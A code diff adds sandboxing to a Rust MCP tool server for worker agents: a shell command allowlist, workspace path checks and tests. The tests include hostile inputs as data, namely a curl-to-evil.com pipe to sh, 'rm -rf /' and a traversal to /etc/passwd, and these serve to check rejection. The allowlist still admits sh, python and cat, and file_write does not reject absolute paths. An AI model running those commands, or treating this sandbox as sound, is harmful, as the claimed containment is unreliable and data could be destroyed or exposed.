@@ -2,11 +2,16 @@
 //!
 //! Implementa un cliente MCP que permite a las obreras descubrir y usar herramientas
 //! externas de forma estandarizada. Compatible con el protocolo MCP v2 de Anthropic.
+//!
+//! **Seguridad:** Las herramientas están contenidas dentro del workspace del repo.
+//! shell_exec solo permite comandos de la allowlist. file_read/file_write validan paths.
 
 #[cfg(feature = "multiagent")]
 use serde::{Deserialize, Serialize};
 #[cfg(feature = "multiagent")]
 use std::collections::HashMap;
+#[cfg(feature = "multiagent")]
+use std::path::Path;
 #[cfg(feature = "multiagent")]
 use tracing::info;
 
@@ -38,6 +43,53 @@ pub struct McpToolResult {
     pub metadata: HashMap<String, String>,
 }
 
+/// Comandos permitidos en shell_exec (allowlist de seguridad).
+#[cfg(feature = "multiagent")]
+const ALLOWED_COMMANDS: &[&str] = &[
+    "cargo", "rustc", "rustfmt", "clippy", "rustup", "python3", "python", "pip", "pip3", "node",
+    "npm", "pnpm", "yarn", "git", "make", "cmake", "sh", "ls", "cat", "grep", "find", "wc", "head",
+    "tail", "echo", "test", "mkdir", "touch", "cp", "mv", "dart", "flutter", "go", "javac", "java",
+    "ruby", "gem",
+];
+
+/// Valida que un path sea seguro (sin traversal, contenido dentro del workspace).
+#[cfg(feature = "multiagent")]
+fn is_safe_path(workspace: &str, user_path: &str) -> Result<std::path::PathBuf, String> {
+    let ws = Path::new(workspace);
+    let candidate = ws.join(user_path);
+
+    // Canonicalizar para resolver symlinks y .. segments
+    let canonical = candidate
+        .canonicalize()
+        .map_err(|e| format!("path inválido: {e}"))?;
+    let ws_canonical = ws
+        .canonicalize()
+        .map_err(|e| format!("workspace inválido: {e}"))?;
+
+    // Verificar que el path canónico esté dentro del workspace
+    if !canonical.starts_with(&ws_canonical) {
+        return Err("path fuera del workspace (traversal detectado)".into());
+    }
+
+    // Rechazar componentes .git
+    for component in canonical.components() {
+        if let std::path::Component::Normal(name) = component {
+            if name == ".git" {
+                return Err("acceso a .git no permitido".into());
+            }
+        }
+    }
+
+    Ok(canonical)
+}
+
+/// Valida que un comando esté en la allowlist.
+#[cfg(feature = "multiagent")]
+fn is_command_allowed(cmd: &str) -> bool {
+    let program = cmd.split_whitespace().next().unwrap_or("");
+    ALLOWED_COMMANDS.iter().any(|&allowed| program == allowed)
+}
+
 /// Servidor MCP local que expone herramientas del repo.
 #[cfg(feature = "multiagent")]
 type McpToolHandler = Box<dyn Fn(&McpToolCall) -> McpToolResult + Send + Sync>;
@@ -46,51 +98,75 @@ type McpToolHandler = Box<dyn Fn(&McpToolCall) -> McpToolResult + Send + Sync>;
 pub struct McpServer {
     tools: HashMap<String, McpTool>,
     handlers: HashMap<String, McpToolHandler>,
+    workspace: String,
 }
 
 #[cfg(feature = "multiagent")]
 impl McpServer {
-    pub fn new() -> Self {
+    pub fn new(workspace: &str) -> Self {
         let mut server = Self {
             tools: HashMap::new(),
             handlers: HashMap::new(),
+            workspace: workspace.to_string(),
         };
         server.register_default_tools();
         server
     }
 
     fn register_default_tools(&mut self) {
-        // Herramienta: ejecutar comando shell
+        let ws = self.workspace.clone();
+
+        // Herramienta: ejecutar comando shell (solo allowlist)
         self.register_tool(
             McpTool {
                 name: "shell_exec".into(),
-                description: "Ejecuta un comando shell en el directorio del repo".into(),
+                description: "Ejecuta un comando permitido en el directorio del repo".into(),
                 input_schema: serde_json::json!({
                     "type": "object",
                     "properties": {
-                        "command": {"type": "string", "description": "Comando a ejecutar"},
-                        "cwd": {"type": "string", "description": "Directorio de trabajo"}
+                        "command": {"type": "string", "description": "Comando a ejecutar (solo comandos permitidos)"},
+                        "args": {"type": "array", "items": {"type": "string"}, "description": "Argumentos del comando"}
                     },
                     "required": ["command"]
                 }),
                 output_schema: None,
             },
-            |call| {
+            move |call| {
                 let cmd = call
                     .arguments
                     .get("command")
                     .and_then(|v| v.as_str())
-                    .unwrap_or("echo no command");
-                let cwd = call
-                    .arguments
-                    .get("cwd")
-                    .and_then(|v| v.as_str())
-                    .unwrap_or(".");
+                    .unwrap_or("");
 
-                let output = std::process::Command::new("sh")
-                    .arg("-c")
-                    .arg(cmd)
-                    .current_dir(cwd)
+                if !is_command_allowed(cmd) {
+                    return McpToolResult {
+                        success: false,
+                        content: String::new(),
+                        error: Some(format!(
+                            "comando '{cmd}' no permitido. Permitidos: {}",
+                            ALLOWED_COMMANDS.join(", ")
+                        )),
+                        metadata: HashMap::new(),
+                    };
+                }
+
+                // Separar programa y argumentos
+                let parts: Vec<&str> = cmd.split_whitespace().collect();
+                let program = parts.first().unwrap_or(&"echo");
+                let mut args: Vec<&str> = parts[1..].to_vec();
+
+                // Agregar args adicionales si existen
+                if let Some(extra_args) = call.arguments.get("args").and_then(|v| v.as_array()) {
+                    for arg in extra_args {
+                        if let Some(s) = arg.as_str() {
+                            args.push(s);
+                        }
+                    }
+                }
+
+                let output = std::process::Command::new(program)
+                    .args(&args)
+                    .current_dir(&ws)
                     .output();
 
                 match output {
@@ -114,60 +190,71 @@ impl McpServer {
             },
         );
 
-        // Herramienta: leer archivo
+        // Herramienta: leer archivo (dentro del workspace)
+        let ws_read = self.workspace.clone();
         self.register_tool(
             McpTool {
                 name: "file_read".into(),
-                description: "Lee el contenido de un archivo".into(),
+                description: "Lee el contenido de un archivo dentro del workspace".into(),
                 input_schema: serde_json::json!({
                     "type": "object",
                     "properties": {
-                        "path": {"type": "string", "description": "Ruta del archivo"}
+                        "path": {"type": "string", "description": "Ruta relativa del archivo"}
                     },
                     "required": ["path"]
                 }),
                 output_schema: None,
             },
-            |call| {
-                let path = call
+            move |call| {
+                let rel_path = call
                     .arguments
                     .get("path")
                     .and_then(|v| v.as_str())
                     .unwrap_or("");
-                match std::fs::read_to_string(path) {
-                    Ok(content) => McpToolResult {
-                        success: true,
-                        content,
-                        error: None,
-                        metadata: HashMap::new(),
+
+                match is_safe_path(&ws_read, rel_path) {
+                    Ok(canonical) => match std::fs::read_to_string(&canonical) {
+                        Ok(content) => McpToolResult {
+                            success: true,
+                            content,
+                            error: None,
+                            metadata: HashMap::new(),
+                        },
+                        Err(e) => McpToolResult {
+                            success: false,
+                            content: String::new(),
+                            error: Some(e.to_string()),
+                            metadata: HashMap::new(),
+                        },
                     },
                     Err(e) => McpToolResult {
                         success: false,
                         content: String::new(),
-                        error: Some(e.to_string()),
+                        error: Some(e),
                         metadata: HashMap::new(),
                     },
                 }
             },
         );
 
-        // Herramienta: escribir archivo
+        // Herramienta: escribir archivo (dentro del workspace)
+        let ws_write = self.workspace.clone();
         self.register_tool(
             McpTool {
                 name: "file_write".into(),
-                description: "Escribe contenido a un archivo".into(),
+                description: "Escribe contenido a un archivo dentro del workspace".into(),
                 input_schema: serde_json::json!({
                     "type": "object",
                     "properties": {
-                        "path": {"type": "string", "description": "Ruta del archivo"},
+                        "path": {"type": "string", "description": "Ruta relativa del archivo"},
                         "content": {"type": "string", "description": "Contenido a escribir"}
                     },
                     "required": ["path", "content"]
                 }),
                 output_schema: None,
             },
-            |call| {
-                let path = call
+            move |call| {
+                let rel_path = call
                     .arguments
                     .get("path")
                     .and_then(|v| v.as_str())
@@ -177,13 +264,49 @@ impl McpServer {
                     .get("content")
                     .and_then(|v| v.as_str())
                     .unwrap_or("");
-                if let Some(parent) = std::path::Path::new(path).parent() {
-                    let _ = std::fs::create_dir_all(parent);
+
+                // Validar path sin canonicalizar (el archivo puede no existir aún)
+                let ws_path = Path::new(&ws_write);
+                let candidate = ws_path.join(rel_path);
+
+                // Verificar que el path relativo no contenga traversal
+                if rel_path.contains("..") {
+                    return McpToolResult {
+                        success: false,
+                        content: String::new(),
+                        error: Some("path traversal (..) no permitido".into()),
+                        metadata: HashMap::new(),
+                    };
                 }
-                match std::fs::write(path, content) {
+
+                // Verificar que no sea .git
+                for component in candidate.components() {
+                    if let std::path::Component::Normal(name) = component {
+                        if name == ".git" {
+                            return McpToolResult {
+                                success: false,
+                                content: String::new(),
+                                error: Some("escritura en .git no permitida".into()),
+                                metadata: HashMap::new(),
+                            };
+                        }
+                    }
+                }
+
+                if let Some(parent) = candidate.parent() {
+                    if let Err(e) = std::fs::create_dir_all(parent) {
+                        return McpToolResult {
+                            success: false,
+                            content: String::new(),
+                            error: Some(format!("crear directorio: {e}")),
+                            metadata: HashMap::new(),
+                        };
+                    }
+                }
+                match std::fs::write(&candidate, content) {
                     Ok(_) => McpToolResult {
                         success: true,
-                        content: format!("escrito: {path}"),
+                        content: format!("escrito: {rel_path}"),
                         error: None,
                         metadata: HashMap::new(),
                     },
@@ -198,6 +321,7 @@ impl McpServer {
         );
 
         // Herramienta: git diff
+        let ws_diff = self.workspace.clone();
         self.register_tool(
             McpTool {
                 name: "git_diff".into(),
@@ -205,19 +329,12 @@ impl McpServer {
                 input_schema: serde_json::json!({
                     "type": "object",
                     "properties": {
-                        "repo_root": {"type": "string"},
                         "cached": {"type": "boolean"}
-                    },
-                    "required": ["repo_root"]
+                    }
                 }),
                 output_schema: None,
             },
-            |call| {
-                let repo = call
-                    .arguments
-                    .get("repo_root")
-                    .and_then(|v| v.as_str())
-                    .unwrap_or(".");
+            move |call| {
                 let cached = call
                     .arguments
                     .get("cached")
@@ -231,7 +348,7 @@ impl McpServer {
 
                 let output = std::process::Command::new("git")
                     .args(&args)
-                    .current_dir(repo)
+                    .current_dir(&ws_diff)
                     .output();
 
                 match output {
@@ -252,28 +369,21 @@ impl McpServer {
         );
 
         // Herramienta: git status
+        let ws_status = self.workspace.clone();
         self.register_tool(
             McpTool {
                 name: "git_status".into(),
                 description: "Obtiene el estado del repositorio Git".into(),
                 input_schema: serde_json::json!({
                     "type": "object",
-                    "properties": {
-                        "repo_root": {"type": "string"}
-                    },
-                    "required": ["repo_root"]
+                    "properties": {}
                 }),
                 output_schema: None,
             },
-            |call| {
-                let repo = call
-                    .arguments
-                    .get("repo_root")
-                    .and_then(|v| v.as_str())
-                    .unwrap_or(".");
+            move |_| {
                 let output = std::process::Command::new("git")
                     .args(["status", "--short"])
-                    .current_dir(repo)
+                    .current_dir(&ws_status)
                     .output();
 
                 match output {
@@ -293,45 +403,49 @@ impl McpServer {
             },
         );
 
-        // Herramienta: búsqueda de patrones (grep)
+        // Herramienta: búsqueda de patrones (grep, solo dentro del workspace)
+        let ws_search = self.workspace.clone();
         self.register_tool(
             McpTool {
                 name: "code_search".into(),
-                description: "Busca un patrón regex en los archivos del repo".into(),
+                description: "Busca un patrón en los archivos del repo (grep)".into(),
                 input_schema: serde_json::json!({
                     "type": "object",
                     "properties": {
-                        "repo_root": {"type": "string"},
-                        "pattern": {"type": "string"},
-                        "file_glob": {"type": "string"}
+                        "pattern": {"type": "string", "description": "Patrón de búsqueda"},
+                        "file_glob": {"type": "string", "description": "Filtro de extensión (ej: *.rs)"}
                     },
-                    "required": ["repo_root", "pattern"]
+                    "required": ["pattern"]
                 }),
                 output_schema: None,
             },
-            |call| {
-                let repo = call
-                    .arguments
-                    .get("repo_root")
-                    .and_then(|v| v.as_str())
-                    .unwrap_or(".");
+            move |call| {
                 let pattern = call
                     .arguments
                     .get("pattern")
                     .and_then(|v| v.as_str())
                     .unwrap_or("");
-                let glob = call.arguments.get("file_glob").and_then(|v| v.as_str());
+
+                // Rechazar patrones que parezcan paths absolutos o opciones maliciosas
+                if pattern.starts_with('-') || pattern.starts_with('/') {
+                    return McpToolResult {
+                        success: false,
+                        content: String::new(),
+                        error: Some("patrón no puede empezar con - o /".into()),
+                        metadata: HashMap::new(),
+                    };
+                }
 
                 let mut args = vec!["-rn", "--include=*"];
-                if let Some(g) = glob {
-                    args = vec!["-rn", g];
+                if let Some(glob) = call.arguments.get("file_glob").and_then(|v| v.as_str()) {
+                    args = vec!["-rn", glob];
                 }
                 args.push(pattern);
                 args.push(".");
 
                 let output = std::process::Command::new("grep")
                     .args(&args)
-                    .current_dir(repo)
+                    .current_dir(&ws_search)
                     .output();
 
                 match output {
@@ -351,7 +465,7 @@ impl McpServer {
             },
         );
 
-        info!(count = 6, "herramientas MCP registradas");
+        info!(count = 6, workspace = %self.workspace, "herramientas MCP registradas");
     }
 
     pub fn register_tool(
@@ -389,20 +503,13 @@ impl McpServer {
     }
 }
 
-#[cfg(feature = "multiagent")]
-impl Default for McpServer {
-    fn default() -> Self {
-        Self::new()
-    }
-}
-
 // Stubs sin la feature
 #[cfg(not(feature = "multiagent"))]
 pub struct McpServer;
 
 #[cfg(not(feature = "multiagent"))]
 impl McpServer {
-    pub fn new() -> Self {
+    pub fn new(_workspace: &str) -> Self {
         Self
     }
 }
@@ -414,7 +521,7 @@ mod tests {
     #[cfg(feature = "multiagent")]
     #[test]
     fn mcp_server_registra_herramientas() {
-        let server = McpServer::new();
+        let server = McpServer::new("/tmp/test_ws");
         let tools = server.list_tools();
         assert!(tools.len() >= 6);
         assert!(tools.iter().any(|t| t.name == "shell_exec"));
@@ -427,26 +534,66 @@ mod tests {
 
     #[cfg(feature = "multiagent")]
     #[test]
-    fn mcp_server_invoca_file_read() {
-        let server = McpServer::new();
+    fn mcp_server_invoca_file_read_path_inexistente() {
+        let server = McpServer::new("/tmp/test_ws_mcp");
+        let _ = std::fs::create_dir_all("/tmp/test_ws_mcp");
         let call = McpToolCall {
             tool_name: "file_read".into(),
             arguments: [(
                 "path".into(),
-                serde_json::Value::String("/nonexistent_file.txt".into()),
+                serde_json::Value::String("nonexistent_file.txt".into()),
+            )]
+            .into_iter()
+            .collect(),
+        };
+        let result = server.call_tool(&call);
+        // El archivo no existe, debe fallar
+        assert!(!result.success);
+        // cleanup
+        let _ = std::fs::remove_dir_all("/tmp/test_ws_mcp");
+    }
+
+    #[cfg(feature = "multiagent")]
+    #[test]
+    fn mcp_server_rechaza_shell_no_permitido() {
+        let server = McpServer::new("/tmp");
+        let call = McpToolCall {
+            tool_name: "shell_exec".into(),
+            arguments: [(
+                "command".into(),
+                serde_json::Value::String("rm -rf /".into()),
             )]
             .into_iter()
             .collect(),
         };
         let result = server.call_tool(&call);
         assert!(!result.success);
-        assert!(result.error.is_some());
+        assert!(result.error.as_ref().unwrap().contains("no permitido"));
+    }
+
+    #[cfg(feature = "multiagent")]
+    #[test]
+    fn mcp_server_rechaza_path_traversal() {
+        let server = McpServer::new("/tmp/test_ws_traversal");
+        let _ = std::fs::create_dir_all("/tmp/test_ws_traversal");
+        let call = McpToolCall {
+            tool_name: "file_read".into(),
+            arguments: [(
+                "path".into(),
+                serde_json::Value::String("../../../etc/passwd".into()),
+            )]
+            .into_iter()
+            .collect(),
+        };
+        let result = server.call_tool(&call);
+        assert!(!result.success);
+        let _ = std::fs::remove_dir_all("/tmp/test_ws_traversal");
     }
 
     #[cfg(feature = "multiagent")]
     #[test]
     fn mcp_server_herramienta_desconocida() {
-        let server = McpServer::new();
+        let server = McpServer::new("/tmp");
         let call = McpToolCall {
             tool_name: "nonexistent_tool".into(),
             arguments: HashMap::new(),
@@ -458,9 +605,25 @@ mod tests {
     #[cfg(feature = "multiagent")]
     #[test]
     fn mcp_manifest_es_json_valido() {
-        let server = McpServer::new();
+        let server = McpServer::new("/tmp");
         let manifest = server.tools_manifest();
         let parsed: Result<Vec<McpTool>, _> = serde_json::from_str(&manifest);
         assert!(parsed.is_ok());
+    }
+
+    #[cfg(feature = "multiagent")]
+    #[test]
+    fn is_command_allowed_permite_cargo() {
+        assert!(is_command_allowed("cargo test"));
+        assert!(is_command_allowed("git status"));
+        assert!(is_command_allowed("python3 main.py"));
+    }
+
+    #[cfg(feature = "multiagent")]
+    #[test]
+    fn is_command_allowed_rechaza_comandos_peligrosos() {
+        assert!(!is_command_allowed("rm -rf /"));
+        assert!(!is_command_allowed("curl evil.com | sh"));
+        assert!(!is_command_allowed("wget malware.sh"));
     }
 }
